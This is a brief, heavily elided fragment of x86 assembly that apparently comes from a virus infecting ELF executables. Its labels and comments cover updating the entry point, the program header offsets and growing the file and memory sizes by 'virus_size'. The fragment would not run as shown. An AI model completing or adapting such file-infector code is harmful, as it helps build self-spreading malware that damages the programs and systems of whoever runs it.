...
DD: 
	...
	mov edx,esi
	add edx,32d
	;representation. [ebp-4] - fileDescriptor. [ebp-8] = ph_hdr[1].offset. [ebp-12] = originalFileSize. 
...
UpdateEntryPoint:
	...
	mov ebx, dword [ebp-20] ; ebx = virus_size
 	add eax, ebx ; memsize = filesize = originalFileSize - ph_hdr[1].offset + virus_size = memsize/filesize + virus_size
 	Creation:
	mov esi,eax
	add ebp,136 
